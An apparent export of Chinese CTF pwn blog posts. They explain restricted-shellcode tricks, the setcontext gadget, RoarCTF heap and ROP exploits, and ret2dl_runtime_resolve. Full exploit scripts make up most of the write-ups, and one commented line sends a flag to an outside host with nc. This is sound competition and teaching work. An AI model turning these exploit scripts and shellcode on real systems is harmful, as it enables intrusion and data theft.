    <content type="text"><![CDATA[这里总结一下shellcode的各种类型 一、直接调用12345678#include &lt;stdio.h&gt;int main(int argc, char const *argv[])&#123; char s[0x500]; gets(s); ((void(*)(void))s)(); return 0;&#125; 直接执行shellcode，考查对shellcode的编写能力，pwntool可以直接生成shellcraft.sh()，没什么难度 二、禁用了system参考pwnable.tw的orw，这种不能直接get shell，但是可以编写shellcode实现fp = open(&quot;flag&quot;) ,read(fp,buf,0x30),write(1,buf,0x30)来读取flag 12345678910111213141516171819202122#32位payload = '''/*fp = open("/home/orw/flag")*/push 0x00006761push 0x6c662f77push 0x726f2f65push 0x6d6f682fmov eax,0x5mov ebx,espxor ecx,ecxint 0x80/*read(fd,buf,0x100)*/mov ebx,eaxmov ecx,espmov edx,0x30mov eax,0x3int 0x80/*write(1,buf,0x100)*/mov ebx,0x1mov eax,0x4int 0x80''' 三、限制字符像这样的 1234567891011// gcc -m64 -z execstack -fPIE -pie -z now chall3.c -o chall3int main() &#123; char buf[0x400]; int n, i; n = read(0, buf, 0x400); if (n &lt;= 0) return 0; for (i = 0; i &lt; n; i++) &#123; if(buf[i] &lt; 32 || buf[i] &gt; 126) return 0; &#125; ((void(*)(void))buf)();&#125; 限制了shellcode为可打印字符，也就是说现在的shellcode中不能出现不可见字符，那么能用的汇编语句就大大减少了，如32位的int 0x80，64位的syscall都不能直接输入，那怎么办呢，参考大牛的总结，此类题目可用到的汇编指令如下 ： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768691.数据传送:push/pop eax…pusha/popa2.算术运算:inc/dec eax…sub al, 立即数sub byte ptr [eax… + 立即数], al dl…sub byte ptr [eax… + 立即数], ah dh…sub dword ptr [eax… + 立即数], esi edisub word ptr [eax… + 立即数], si disub al dl…, byte ptr [eax… + 立即数]sub ah dh…, byte ptr [eax… + 立即数]sub esi edi, dword ptr [eax… + 立即数]sub si di, word ptr [eax… + 立即数]3.逻辑运算:and al, 立即数and dword ptr [eax… + 立即数], esi ediand word ptr [eax… + 立即数], si diand ah dh…, byte ptr [ecx edx… + 立即数]and esi edi, dword ptr [eax… + 立即数]and si di, word ptr [eax… + 立即数]xor al, 立即数xor byte ptr [eax… + 立即数], al dl…xor byte ptr [eax… + 立即数], ah dh…xor dword ptr [eax… + 立即数], esi edixor word ptr [eax… + 立即数], si dixor al dl…, byte ptr [eax… + 立即数]xor ah dh…, byte ptr [eax… + 立即数]xor esi edi, dword ptr [eax… + 立即数]xor si di, word ptr [eax… + 立即数]4.比较指令:cmp al, 立即数cmp byte ptr [eax… + 立即数], al dl…cmp byte ptr [eax… + 立即数], ah dh…cmp dword ptr [eax… + 立即数], esi edicmp word ptr [eax… + 立即数], si dicmp al dl…, byte ptr [eax… + 立即数]cmp ah dh…, byte ptr [eax… + 立即数]cmp esi edi, dword ptr [eax… + 立即数]cmp si di, word ptr [eax… + 立即数]5.转移指令:push 56hpop eaxcmp al, 43hjnz lable&lt;=&gt; jmp lable6.交换al, ahpush eaxxor ah, byte ptr [esp] // ah ^= alxor byte ptr [esp], ah // al ^= ahxor ah, byte ptr [esp] // ah ^= alpop eax7.清零:push 44hpop eaxsub al, 44h ; eax = 0push esipush esppop eaxxor [eax], esi ; esi = 0 所以考查的是我们用上面有限的汇编指令编写出可用的shellcode，基本思想：mov a,b 用 push b;pop a替换;而像int 0x80 ; syscall这种则通过xor sub and inc dec运算来操作shellcode使之变成我们要的指令； 参数题目pwnable.tw的death_note 具体wp 不过还是有工具可以生成可打印shellcode x86可以msf内置的encoder，x64用github上的shellcode_encoder 但是个人觉得，，工具有点局限，并不是万能的 四、字符限制范围更小上面的字符限制还是可见字符，但是还可以继续限制到[A-Z],[a-z],[0-9]也就是字母和数字 像这样 1234567891011// gcc -m32 -z execstack -fPIE -pie -z now chall2.c -o chall2int main() &#123; char buf[0x200]; int n, i; n = read(0, buf, 0x200); if (n &lt;= 0) return 0; for (i = 0; i &lt; n; i++) &#123; if(!((buf[i] &gt;= 65 &amp;&amp; buf[i] &lt;= 90) || (buf[i] &gt;= 48 &amp;&amp; buf[i] &lt;= 57))) return 0; &#125; ((void(*)(void))buf)();&#125; 这是中科大校赛上的一题，同样可以用msf生成符合的shellcode exp: 123456789from pwn import *context.log_level = 'debug'# p = process('./chall2')p = remote("202.38.93.241","10002")p.recvuntil("token: ")p.sendline("747:MEUCIBfqi0tiRKDbsSHczXVE7bwl3E2tvvYq46DisJi/LvE7AiEApxxz/mPdbr8kKbWmMtN4g6M17oOXTKJhGbZSYH43TAw=")pause()p.send("PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJTK0XZ9V2U62HFMBCMYJGRHFORSE8EP2HFO3R3YBNLIJC1BZHDHS05PS06ORB2IRNFOT3RH30PWF3MYKQXMK0AA")p.interactive() 五、禁用了system和open这种情况在2018-XNUCA-steak中出现，具体程序漏洞的分析可以参考看雪上面大佬的：https://bbs.pediy.com/thread-250635.htm https://bbs.pediy.com/thread-249556.htm 这里主要介绍在shellcode的编写：其主要思想就是通过调用32位的open来绕过，因为程序只是对64位的代码做限制，而通过写32位的shellcode能到达到open的目的，以32位的模式运行。 （骚操作，通过retfq切换模式），下面会以一道倒是来详细分析这种做法。 六、禁用了system和open，还限制了shellcode字符这种情况可以说是我目前见到的最恶心的shellcode了，这就是来自ex师傅的shellcode题目 接下来详细分析一下这道题 12345678910111213$ seccomp-tools dump ./shellcode ---------- Shellcode ---------- line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000000 A = sys_number 0001: 0x15 0x06 0x00 0x00000005 if (A == fstat) goto 0008 0002: 0x15 0x05 0x00 0x00000025 if (A == alarm) goto 0008 0003: 0x15 0x04 0x00 0x00000001 if (A == write) goto 0008 0004: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0008 0005: 0x15 0x02 0x00 0x00000009 if (A == mmap) goto 0008 0006: 0x15 0x01 0x00 0x000000e7 if (A == exit_group) goto 0008 0007: 0x06 0x00 0x00 0x00000000 return KILL 0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW 查看一下沙箱发现，只允许6个函数，但是没有open，不过有mmap，并不知道有什么用，先放着 IDA看一下程序 123456789for ( i = 0; i &lt; v4; ++i ) &#123; if ( *(_BYTE *)(i + 9LL) &lt;= 31 || *(_BYTE *)(i + 9LL) == 127 ) &#123; __asm &#123; syscall; LINUX - sys_write &#125; goto LABEL_10; &#125; &#125; MEMORY[9](0LL, 9LL, 4096LL, a4, 0xFFFFFFFFLL, 0LL); 这里对输入进行检测，只能在可见字符范围 所以，我们要用这有限的输入，有限的函数cat flag 在这里我们要先知道，程序是怎么知道要以64位模式运行还是以32位模式运行的；寄存器中有一个cs寄存器，cs = 0x23代表32位模式，cs = 0x33代表64位模式，而cs寄存器就是通过上面提到的retfq汇编指令来修改，具体怎么修改？ retfq有两步操作，ret以及set cs，所以执行retfq会跳转到rsp同时将cs设置为[rsp+0x8]，我们只需要事先在ret位置写入32位的shellcode就可以执行了，但是这里有一点需要注意的是，retfq跳转过去的时候程序已经切换成了32位模式，所以地址解析也是以32位的规则来的，所以原先的rsp = 0x7ffe530d01b8会被解析成esp = 0x530d01b8 所以在跳转过去后要先平衡好esp的地址，不能直接执行push ... 还有就是这个返回地址0x40404040怎么来的，这就用到了mmap函数了，因为shellcode是写到栈上面的，如果把32位的shellcode在栈上的话，因为64位的栈地址长度比32位的长，所以32位模式下是无法解析出64位的栈地址的，retfq时就会crash掉，所以这里需要先调用mmap申请出一段适合32位的地址来存32位shellcode，mmap(0x40404040,0x7e,7,34,0,0) 走到这一步这道题基本完成了，我一开始的想法是直接调用32位下的read,write把flag打印出来，但是发现是bad system call，无法调用，所以还得回到64位模式下调用，再调用一次retfq 这里需要先把open的返回值保存到别的寄存器，因为在retfq回64位模式的时候会影响到rax 最后就read,write打印出来就OK啦！ 整体思路： 123451、用可见字符编写shellcode 调用mmap申请地址，调用read读入32位shellcode2、同时构造用retfq切换到32位模式，跳转到32位shellcode 位置3、按照32位规则调用fp = open(&quot;flag&quot;)4、保存open函数返回的fp指针，再次调用retfq切换回64模式，跳转到64位shellcode位置5、执行read,write打印flag exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154#coding:utf-8from pwn import *context.log_level = 'debug'p = process('./shellcode')# p = remote("nc.eonew.cn","10011")p.recvuntil("shellcode: ")append_x86 = '''push ebxpop ebx'''shellcode_x86 = '''/*fp = open("flag")*/mov esp,0x40404140push 0x67616c66push esppop ebxxor ecx,ecxmov eax,5int 0x80mov ecx,eax'''shellcode_flag = '''push 0x33push 0x40404089retfq/*read(fp,buf,0x70)*/mov rdi,rcxmov rsi,rspmov rdx,0x70xor rax,raxsyscall/*write(1,buf,0x70)*/mov rdi,1mov rax,1syscall'''shellcode_x86 = asm(shellcode_x86)shellcode_flag = asm(shellcode_flag,arch = 'amd64',os = 'linux')shellcode = ''append = '''push rdxpop rdx'''# 0x40404040 为32位shellcode地址shellcode_mmap = '''/*mmap(0x40404040,0x7e,7,34,0,0)*/push 0x40404040 /*set rdi*/pop rdipush 0x7e /*set rsi*/pop rsipush 0x40 /*set rdx*/pop raxxor al,0x47push raxpop rdxpush 0x40 /*set r8*/pop raxxor al,0x40push raxpop r8push rax /*set r9*/pop r9/*syscall*/push rbxpop raxpush 0x5dpop rcxxor byte ptr[rax+0x31],clpush 0x5fpop rcxxor byte ptr[rax+0x32],clpush 0x22 /*set rcx*/pop rcxpush 0x40/*set rax*/pop raxxor al,0x49'''shellcode_read = '''/*read(0,0x40404040,0x70)*/push 0x40404040pop rsipush 0x40pop raxxor al,0x40push raxpop rdixor al,0x40push 0x70pop rdxpush rbxpop raxpush 0x5dpop rcxxor byte ptr[rax+0x57],clpush 0x5fpop rcxxor byte ptr[rax+0x58],clpush rdxpop raxxor al,0x70'''shellcode_retfq = '''push rbxpop raxxor al,0x40push 0x72pop rcxxor byte ptr[rax+0x40],clpush 0x68pop rcxxor byte ptr[rax+0x40],clpush 0x47pop rcxsub byte ptr[rax+0x41],clpush 0x48pop rcxsub byte ptr[rax+0x41],clpush rdipush rdipush 0x23push 0x40404040pop raxpush rax'''shellcode += shellcode_mmapshellcode += appendshellcode += shellcode_readshellcode += appendshellcode += shellcode_retfqshellcode += appendshellcode = asm(shellcode,arch = 'amd64',os = 'linux')print hex(len(shellcode))# pause()gdb.attach(p,"b *0x40027f\nb*0x4002eb\nc\nc\nsi\n")p.sendline(shellcode)pause()p.sendline(shellcode_x86 + 0x29*'\x90' + shellcode_flag)p.interactive() 最后ex师傅牛逼！]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[setcontext 函数]]></title>
    <url>%2F2020%2F06%2F21%2Fsetcontext%2F</url>
    <content type="text"><![CDATA[123#include &lt;ucontext.h&gt;int setcontext(const ucontext_t *ucp); 其作用是用户上下文的设置，所以我们在可以小范围控制执行流已知libc_base但不足以完成我们的目标时可以先跳setcontext+53来扩大控制范围。非常好用的一个函数，可以直接控制大部分寄存器和执行流 1234567891011121314151617181920212223242526272829303132333435&lt;setcontext&gt;: push rdi&lt;setcontext+1&gt;: lea rsi,[rdi+0x128]&lt;setcontext+8&gt;: xor edx,edx&lt;setcontext+10&gt;: mov edi,0x2&lt;setcontext+15&gt;: mov r10d,0x8&lt;setcontext+21&gt;: mov eax,0xe&lt;setcontext+26&gt;: syscall &lt;setcontext+28&gt;: pop rdi&lt;setcontext+29&gt;: cmp rax,0xfffffffffffff001&lt;setcontext+35&gt;: jae 0x7ffff7a54bc0 &lt;setcontext+128&gt;&lt;setcontext+37&gt;: mov rcx,QWORD PTR [rdi+0xe0]&lt;setcontext+44&gt;: fldenv [rcx]&lt;setcontext+46&gt;: ldmxcsr DWORD PTR [rdi+0x1c0]&lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0]&lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80]&lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78]&lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48]&lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50]&lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58]&lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60]&lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8]&lt;setcontext+94&gt;: push rcx&lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70]&lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88]&lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98]&lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28]&lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30]&lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68]&lt;setcontext+125&gt;: xor eax,eax&lt;setcontext+127&gt;: ret &lt;setcontext+128&gt;: mov rcx,QWORD PTR [rip+0x356951] # 0x7ffff7dd3e78&lt;setcontext+135&gt;: neg eax&lt;setcontext+137&gt;: mov DWORD PTR fs:[rcx],eax&lt;setcontext+140&gt;: or rax,0xffffffffffffffff&lt;setcontext+144&gt;: ret 至于为什么要从setcontext+53开始，因为fldenv [rcx]指令会造成程序crash，所以要避开这个指令，正如汇编一样，跳到setcontext+53可以直接地控制rsp,rbx等多个寄存，都由rdi的内容决定 注意：要构造好rsp的值，因为有push rcx 指令，如果 rsp指向的内存不可访问同样会crash. 构造ucontext_t可以直接用pwntools的SigreturnFrame() 12345678# 指定机器的运行模式context.arch = "amd64"# 设置寄存器frame = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = 0frame.rdx = 0 注意：[rdi+0xa8]（被弹到rcx的那个地址）对应的是 frame 框架的 rip 。 利用思路：一般用来执行mprotect函数，后注放shellcode。也可以直接执行ROP链。 参考：http://blog.eonew.cn/archives/993 https://n132.github.io/2019/05/10/2019-05-08-Startctf2019-Heap-master/#setcontext]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RoarCtf - pwn]]></title>
    <url>%2F2020%2F06%2F21%2FRoarCTF%2F</url>
    <content type="text"><![CDATA[easy_pwn123456789101112131415// off-by-one__int64 __fastcall sub_E26(signed int a1, unsigned int a2)&#123; __int64 result; // rax if ( a1 &gt; a2 ) return a2; if ( a2 - a1 == 10 ) LODWORD(result) = a1 + 1; //off-by-one else LODWORD(result) = a1; return result; write 函数中只要输入的size 减去原先的 = 10就能多写一个字节，因为堆块的申请是用calloc所以不能直接free一个unsortbin再申请出来的方式漏泄地址；申请三个堆块chunk0,chunk1,chunk2覆写chunk1的size为chunk1.size+chunk2.size，free(1),这样chunk2就被放到unsortbin中去了，再申请chunk1.size大小的堆块就能把main_arena写到chunk2去，再show。接着就malloc_hook填onegadget exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#coding:utf-8from pwn import *context.log_level = 'debug'local = 0if local: p = process('./easy_pwn') elf = ELF('./easy_pwn') libc = elf.libc# nc 39.97.182.233 38020else: p = remote("39.97.182.233","38020 ") elf = ELF('./easy_pwn') libc = elf.libc#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202048) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def create(size): ru("choice: ") sl('1') ru("size: ") sl(str(size))def write(id,size,data): ru("choice: ") sl('2') ru("index: ") sl(str(id)) ru("size: ") sl(str(size)) ru("content: ") sd(data)def free(id): ru("choice: ") sl('3') ru("index: ") sl(str(id))def show(id): ru("choice: ") sl('4') ru("index: ") sl(str(id))chunk_addr = 0x555555756048one = [0x45216,0x4526a,0xf02a4,0xf1147]create(0x28)#0create(0x88)#1create(0x58)#2create(0x28)#3write(0,0x28+10,0x28*'a' + '\xf1')free(1)create(0x88)#4show(2)ru("content: ")main_arena = u64(rc(6).ljust(8,'\x00'))-88malloc_hook = main_arena - 0x10fack_chunk = malloc_hook - 0x23libc_base = main_arena - 0x3c4b20free_hook = libc_base + libc.symbols['__free_hook']realloc_hook = libc_base + libc.symbols['__realloc_hook']realloc = libc_base + libc.symbols['realloc']onegadget = libc_base + one[1]system = libc_base + libc.symbols['system']log.warn("main_arena --&gt; %s",hex(main_arena))log.warn("fack_chunk --&gt; %s",hex(fack_chunk))log.warn("system --&gt; %s",hex(system))create(0x58)write(3,0x10,p64(0) + p64(0x21))write(1,0x88+10,0x88*'a' + '\x71')free(4)write(2,0x10,p64(fack_chunk)*2)create(0x68)#4create(0x68)#5write(5,8+0x13,0xb*'a' + p64(onegadget) + p64(realloc))create(32)# debug()p.intera easy_heap程序开始会有两个输入，username,inof，都是存放到bss段的 4个功能 12341、add 通过malloc申请一个堆块放到全局变量buf中去，大小限制为（&lt;0x80），且该变量只能存放一个堆指针2、dele free调buf中的堆，但是没有清空指针，存在UAF3、show 打印出buf指针中的内容，但是需要qword_602090 == 0xDEADBEEFDEADBEEFLL才能使用，且使用完 后会将标准输出和错误输出关闭(close(1),close(2))666、没有出现在菜单的功能，有两个功能，calloc(0xa0,1)并将指针放到全局变量ptr中，以及free(ptr) 思路： 只要能用show，这题基本就算是解决了，那现在要解决的是如何修改qword_602090的值为0xDEADBEEFDEADBEEFLL，我的做法的构造double free 先calloc(0xa0,1)再free(ptr)这时ptr中就放着top chunk，再mallloc(0x60)两次就能使ptr，buf两个指针放着现个大小相同的堆，接下来就可以实现double free了。将username作为fack chunk申请出来修改qword_602090，之后将malloc_hook填为onegadget即可 但是这里有个坑导致我在赛中没能做出来，就是4个onegadget都用不了，利用realloc调偏移也无济于事。也是在赛后师兄提醒下才知道的，可以连续free一个堆块两次来解发malloc_hook，这样做的好处就是在调用malloc_hook前会先调用malloc_printer，所以会改变堆的结构，再利用realloc调偏移就有更大的可能满足onegadget的条件了。 这里有个问题我没法解释的，希望如果有大佬明白的话还请不吝赐教，如下图：明明在show函数中已经把标准输出及错误输出关闭了，那为什么在getshell后ls能打印出东西呢？ exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./pwn') elf = ELF('./pwn') libc = elf.libcelse: elf = ELF('./easyheap') libc = elf.libc p = remote("39.97.182.233",30411) #p = remote('127.0.0.1',9996) # elf = ELF('./')sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def init(username,info): ru("username:") sl(username) ru("info:") sl(info)def add(size,data,flag=0): if flag: sl('1') sl(str(size)) sl(data) else: ru("&gt;&gt; ") sl('1') ru("size\n") sl(str(size)) ru("content\n") sl(data)def free(): ru("&gt;&gt; ") sl('2')def show(): ru("&gt;&gt; ") sl('3')def calloc_or_free(choice,data=''): ru("&gt;&gt; ") sl('666') ru("free?\n") sl(str(choice)) if choice == 1: ru("content\n") sl(data)def price(): ru("&gt;&gt; ") sl('666')main = 0x400940one = [0x45216,0x4526a,0xf02a4,0xf1147]# [rax == NULL;[rsp+0x30] == NULL,[rsp+0x50] == NULL,[rsp+0x70] == NULL]chunk_addr = 0x602088username_addr = 0x602060info_addr = 0x6020A0ptr = 0x602098username = p64(0) + p64(0x71) + p64(username_addr)# info = p64(0) + p64(0x71) + p64(username_addr)init(username,'bbbb')calloc_or_free(1,'a')calloc_or_free(2)add(0x68,'')add(0x68,'')calloc_or_free(2)free()price()#用来路过0x602010=0的情况calloc_or_free(2)add(0x68,p64(username_addr))add(0x68,'p')add(0x68,'p')pay = p64(username_addr)*3 + p64(elf.got['free']) + p64(0xDEADBEEFDEADBEEF)add(0x68,pay)# gdb.attach(p,"b *0x400C6F")show()free_addr = u64(rc(6).ljust(8,'\x00'))libc_base = free_addr - libc.symbols['free']realloc = libc_base + libc.symbols['realloc']malloc_hook = libc_base + libc.symbols['__malloc_hook']free_hook = libc_base + libc.symbols['__free_hook']fack_chunk = malloc_hook - 0x23open_addr = libc_base + libc.symbols['open']onegadget = libc_base + 0xf1147log.warn("free_addr --&gt; %s",hex(free_addr))log.warn("libc_base --&gt; %s",hex(libc_base))log.warn("fack_chunk --&gt; %s",hex(fack_chunk))log.warn("open_addr --&gt; %s",hex(open_addr))log.warn("onegadget --&gt; %s",hex(onegadget))pay = p64(fack_chunk)add(0x68,pay,1)add(0x68,'a',1)add(0x68,(0x13-8)*'9' + p64(onegadget) + p64(realloc+0x14),1)#pause()sl('2')sl('2')sleep(1)# p.sendline("cat flag | nc 39.108.76.129 2333")# p.sendline("ls &gt;&amp;0")p.interactive() realloc_magic程序64位保护全开，功能有3个 12345671、realloc(size)2、free(realloc_ptr) UAF666、lock:if (realloc_ptr != null) realloc_ptr = 0且只能用一次，第二次使用就是退出且只能存放一个堆指针 思路：程序没有show函数，所以要泄露地址应该攻击IO_file，环境是ubuntu18，所以有tcache 因为程序开启了PIE，所以得想办法让tcache链上main_arena而且能够修改fd然后申请出来： 12345678910111213141516realloc(0x78,'a')realloc(0)realloc(0x100,'b')realloc(0)realloc(0x8,'c') #要加上一个堆隔开top chunk，在realloc(0x180)的时候才能触发合并(至于为什么，菜鸡也没法解释(哭),求各位大佬解答)realloc(0)realloc(0x100,'b')for i in range(7): free()realloc(0)realloc(0x70,'a')pay = 0x70*'a' + p64(0x21)*2 + '\x60\x07\xdd'realloc(0x180,pay)realloc(0)realloc(0x100,'a')realloc(0) 直接将_IO_2_1_stdout_申请出来，泄露完地址后修改free_hook为onegadget，建议先关闭ASLR做 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#coding:utf-8from pwn import *# context.log_level = 'debug'local = 1if local: p = process('./pwn') elf = ELF('./pwn') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202058) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def realloc(size,data=''): ru("&gt;&gt; ") sl('1') ru("Size?\n") sl(str(size)) if data: ru("Content?\n") sd(data)def free(): ru("&gt;&gt; ") sl('2')def lock(): ru("&gt;&gt; ") sl('666')def pwn(): realloc(0x78,'a') realloc(0) realloc(0x100,'b') realloc(0) realloc(0x8,'c') realloc(0) realloc(0x100,'b') for i in range(7): free() realloc(0) realloc(0x70,'a') pay = 0x70*'a' + p64(0x21)*2 + '\x60\x07\xdd' realloc(0x180,pay) realloc(0) realloc(0x100,'a') realloc(0) pay = p64(0xfbad1887) + p64(0)*3 + '\x00' realloc(0x100,pay) libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x3ed8b0 free_hook = libc_base + libc.symbols['__free_hook'] onegadget = libc_base + 0x4f322 log.warn("libc_base --&gt; %s",hex(libc_base)) log.warn("free_hook --&gt; %s",hex(free_hook)) lock() pay = 'a'*0x78 + p64(0x31) + p64(free_hook) realloc(0x180,pay) realloc(0) realloc(0x10,'a') realloc(0) realloc(0x10,p64(onegadget)) free() # debug() p.interactive()pwn()#关闭aslr# i = 0# while 1:# try:# i += 1# log.info(str(i))# p = process('./pwn')# pwn()# except Exception:# # log.warn("wrong!")# p.close() 参考题目：https://xz.aliyun.com/t/6259#toc-0 easy_rop保护： 12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 没有开canary ，而且程序存在很明显的栈溢出 12345678910while ( !feof(stdin) ) &#123; v9 = fgetc(stdin); if ( v9 == 10 ) break; v3 = v10++; v8 = v3; v7[v3] = v9; &#125; v7[v10] = 0; 这里可以无限输入直到遇到’\n’，相当于gets，但是需要注意一下下标，各个变量在栈中的布局是这样的 1234567891011121314-0000000000000424 var_424 dd ?-0000000000000420 v7 db 1032 dup(?)-0000000000000018 v8 dq ?-0000000000000010 db ? ; undefined-000000000000000F db ? ; undefined-000000000000000E db ? ; undefined-000000000000000D db ? ; undefined-000000000000000C db ? ; undefined-000000000000000B db ? ; undefined-000000000000000A db ? ; undefined-0000000000000009 v9 db ?-0000000000000008 v10 dq ?+0000000000000000 s db 8 dup(?)+0000000000000008 r db 8 dup(?) 所以不能直接0x428个垃圾字符填过去，修改下标v10到ret即可 还有一点，程序禁用了execve，所以要用orw来读取flag，用rop实现和写shellcode都行 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#coding:utf-8from pwn import *context.log_level = 'debug'p = process('./pwn')elf = ELF('./pwn')libc = elf.libcsd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)pop_rdi = 0x401b93pop_rsi_r15 = 0x401b91pop_rdx = 0x1b92main = 0x4019F3pay = 0x418*'a' + '\x28'pay += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])pay += p64(main)# gdb.attach(p,"b *0x401AB4")sla("&gt;&gt; ",pay)ru("path.\n\x00")puts_addr = u64(rc(6).ljust(8,'\x00'))libc_base = puts_addr - libc.symbols['puts']gets_addr = libc_base + libc.symbols['gets']mprotect = libc_base + libc.symbols['mprotect']pop_rdx += libc_baselog.success("puts_addr --&gt; %s",hex(puts_addr))log.success("libc_base --&gt; %s",hex(libc_base))pay = 0x418*'a' + '\x28'pay += p64(pop_rdi) + p64(elf.bss())pay += p64(gets_addr) #输入shellcodepay += p64(pop_rdi) + p64(elf.bss()&amp;0xfffffffffffff000)pay += p64(pop_rsi_r15) + p64(0x1000) + p64(0)pay += p64(pop_rdx) + p64(7)pay += p64(mprotect) + p64(elf.bss())# gdb.attach(p,"b *0x401AB4")sla("&gt;&gt; ",pay)shellcode = '''/*open("flag")*/push 0x67616c66mov rdi,rspxor rsi,rsimov rax,2syscall/*read(fp,buf,0x30)*/mov rdi,raxmov rsi,rspmov rdx,0x30xor rax,raxsyscall/*write(1,buf,0x30)*/mov rdi,1mov rax,1syscall'''shellcode = asm(shellcode,arch = 'amd64',os = 'linux')sl(shellcode)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ret2dl_runtime_resolve]]></title>
    <url>%2F2020%2F06%2F21%2Fre2dl_runtime_resolve%2F</url>
    <content type="text"><![CDATA[认真梳理一下re2dl_runtime_resolve 原理写个c程序自己测试一下： 12345678910111213#include &lt;stdio.h&gt;void vuln()&#123; char buf[28]; read(0,buf,128);&#125;int main(int argc, char const *argv[])&#123; char name[] = "input your name: "; write(1,name,strlen(name)); vuln(); return 0;&#125;// gcc -g -m32 -fno-stack-protector test.c test32 第一次调用strlen函数会先跳到 strlen plt表中去，接着执行jmp指令到0x804a010去，这里是 got 表 可以看到strlen@got中存放的是strlen@plt的第二条指令：0x8048336 &lt;strlen@plt+6&gt; push 8对比一下__libc_start_main(已经调用过一次的函数) 放着的则是__libc_start_main的真实地址，而由于strlen函数第一次调用，所以got表上还没有绑定上真实地址，一律放着的都是 fun@plt+6这个地址，看下面未调用的write也是一样 而执行完 push 指令后，执行jmp 0x8048310，再 push 0x804a004的内容后跳到_dl_runtime_resolve 而0x804a004正是GOT[1]，也就是push GOT[1]，后jmp GOT[2]，而GOT[2]放着的正是_dl_runtime_resolve的真实地址。 123456GOT表内容GOT[0] 0x804a000 —▸ 0x8049f14 --&gt; .dynamic的地址GOT[1] 0x804a004 —▸ 0xf7ffd918 --&gt; link_map :此处包含链接器的标识信息GOT[2] 0x804a008 —▸ 0xf7fee000 --&gt; dl_runtime_resolve 动态链接器的入口GOT[3] 0x804a00c —▸ 0x8048326 (read@plt+6)..... 所以实际上，就是执行了_dl_runtime_resolve(link_map, reloc_arg)来得到函数的真实地址，并写到got表中去，之后 call fun@plt的第一次jmp的时候，就可以直接跳到真实地址上去了。 用一张图直观地显示函数第一次调用和第二次调用的流程： 接着我们往下看看link_map里面有什么东西 可以看到有个.dynamic地址，这里简单介绍一下程序中的各种段 .dynamic，动态节一般保存了ELF文件如下信息： 依赖于哪些动态库 动态符号节信息 动态字符串信息 动态节的结构是这样的： 12345678typedef struct &#123; Elf32_Sword d_tag; union &#123; Elf32_Word d_val; Elf32_Addr d_ptr; &#125; d_un;&#125; Elf32_Dyn;extern Elf32_Dyn_DYNAMIC[]; 用readelf -d test32可以打印出程序的动态节内容 1234567891011121314151617181920212223242526Dynamic section at offset 0xf14 contains 24 entries: 标记 类型 名称/值 0x00000001 (NEEDED) 共享库：[libc.so.6] 0x0000000c (INIT) 0x80482ec 0x0000000d (FINI) 